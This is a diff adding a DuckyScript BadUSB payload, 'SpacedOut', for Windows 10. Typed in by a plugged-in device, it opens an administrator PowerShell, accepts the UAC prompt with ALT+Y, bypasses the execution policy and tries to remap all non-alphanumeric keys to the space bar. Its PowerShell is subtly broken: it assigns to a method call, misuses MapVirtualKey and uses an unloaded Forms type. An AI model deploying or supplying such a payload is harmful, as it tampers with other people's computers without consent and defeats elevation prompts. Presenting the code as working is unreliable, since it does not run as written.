@@ -1,0 +1,95 @@
+REM Title: SpacedOut
+REM Author: Dillan Thrasher
+REM Description: Remaps all non-alphanumeric keys on the keyboard to the space bar.
+REM Target: Windows 10
+REM Version: 1.0
+REM Category: General
+
+DELAY 5000
+
+REM Open PowerShell as Administrator
+GUI r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 500
+
+REM Execute keyboard remapping script
+STRING Set-ExecutionPolicy Bypass -Scope Process -Force; `n
+STRING $scriptBlock = {
+STRING     Add-Type -TypeDefinition @'
+STRING     using System;
+STRING     using System.Runtime.InteropServices;
+STRING     public class Keyboard {
+STRING         [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
+STRING         public static extern short GetKeyState(int virtualKeyCode);
+STRING         [DllImport("user32.dll")]
+STRING         public static extern int MapVirtualKey(int uCode, int uMapType);
+STRING     }
+STRING     '@
+STRING 
+STRING     $mapping = @{
+STRING         '{ESC}'= 'SPACE'
+STRING         '{TAB}'= 'SPACE'
+STRING         '{CAPSLOCK}'= 'SPACE'
+STRING         '{SHIFT}'= 'SPACE'
+STRING         '{CTRL}'= 'SPACE'
+STRING         '{ALT}'= 'SPACE'
+STRING         '{BACKSPACE}'= 'SPACE'
+STRING         '{ENTER}'= 'SPACE'
+STRING         '{LWIN}'= 'SPACE'
+STRING         '{RWIN}'= 'SPACE'
+STRING         '{MENU}'= 'SPACE'
+STRING         '{LEFT}'= 'SPACE'
+STRING         '{RIGHT}'= 'SPACE'
+STRING         '{UP}'= 'SPACE'
+STRING         '{DOWN}'= 'SPACE'
+STRING         '{HOME}'= 'SPACE'
+STRING         '{END}'= 'SPACE'
+STRING         '{PAGEUP}'= 'SPACE'
+STRING         '{PAGEDOWN}'= 'SPACE'
+STRING         '{INSERT}'= 'SPACE'
+STRING         '{DELETE}'= 'SPACE'
+STRING         '{NUMLOCK}'= 'SPACE'
+STRING         '{SCROLLLOCK}'= 'SPACE'
+STRING         '{PAUSE}'= 'SPACE'
+STRING         '{F1}'= 'SPACE'
+STRING         '{F2}'= 'SPACE'
+STRING         '{F3}'= 'SPACE'
+STRING         '{F4}'= 'SPACE'
+STRING         '{F5}'= 'SPACE'
+STRING         '{F6}'= 'SPACE'
+STRING         '{F7}'= 'SPACE'
+STRING         '{F8}'= 'SPACE'
+STRING         '{F9}'= 'SPACE'
+STRING         '{F10}'= 'SPACE'
+STRING         '{F11}'= 'SPACE'
+STRING         '{F12}'= 'SPACE'
+STRING         '{OEM_1}'= 'SPACE'  # ;:
+STRING         '{OEM_PLUS}'= 'SPACE'  # =+
+STRING         '{OEM_COMMA}'= 'SPACE'  # ,<
+STRING         '{OEM_MINUS}'= 'SPACE'  # -_
+STRING         '{OEM_PERIOD}'= 'SPACE'  # .>
+STRING         '{OEM_2}'= 'SPACE'  # /?
+STRING         '{OEM_3}'= 'SPACE'  # `~
+STRING         '{OEM_4}'= 'SPACE'  # [{
+STRING         '{OEM_5}'= 'SPACE'  # \|
+STRING         '{OEM_6}'= 'SPACE'  # ]}
+STRING         '{OEM_7}'= 'SPACE'  # '"
+STRING     }
+STRING 
+STRING     $VK = [System.Windows.Forms.Keys]
+STRING     foreach ($key in $mapping.Keys) {
+STRING         $scanCode = [int]::Parse($VK::$key)
+STRING         $newCode = [int]::Parse($VK::$mapping[$key])
+STRING         [Keyboard]::MapVirtualKey($scanCode, 0) = $newCode
+STRING     }
+STRING }
+STRING Invoke-Command -ScriptBlock $scriptBlock
+ENTER
+
+REM Close PowerShell
+STRING exit
+ENTER
